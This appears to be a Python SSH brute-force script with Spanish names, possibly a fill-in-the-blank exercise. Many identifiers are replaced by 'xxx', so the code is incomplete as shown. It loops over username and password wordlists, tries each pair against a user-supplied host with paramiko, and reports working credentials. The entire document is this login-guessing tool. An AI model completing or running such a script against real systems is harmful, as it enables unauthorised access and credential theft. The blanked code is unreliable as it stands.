import paramiko
import socket
import time

def ssh_fuerza_bruta(hostname,port,usuario,password):
    log = paramiko.util.xxx('log.log')
    ssh_client = xxx.SSHClient()
    ssh_client.xxx()
    ssh_client.set_missing_host_key_policy(paramiko.xxx())
    try:
        print('Comprobando credenciales {}:{}'.format(xxx,xxx))
        ssh_client.xxx(xxx,port=port,username=xxx,password=xxx, timeout=5)
        print('credenciales ok {}:{}'.format(usuario,password))
    except paramiko.xxx as exception:
        print('AuthenticationException:',exception)
    except socket.xxx as error:
        print('SocketError:',error)


def main():
    hostname = input("Introduce el nombre del host: ")
    port = input("Introduce el puerto: ")
    users = xxx('usuarios.txt','r')
    usuarios = users.xxx()
    passwords = xxx('passwords.txt','r')
    passwords = passwords.xxx()
    print(usuarios)

    for usuario in xxx:
        for password in xxx:
            time.xxx(3)
            ssh_fuerza_bruta(xxx,xxx,xxx.rstrip(),xxx.rstrip())


if __name__ == '__main__':
    main()
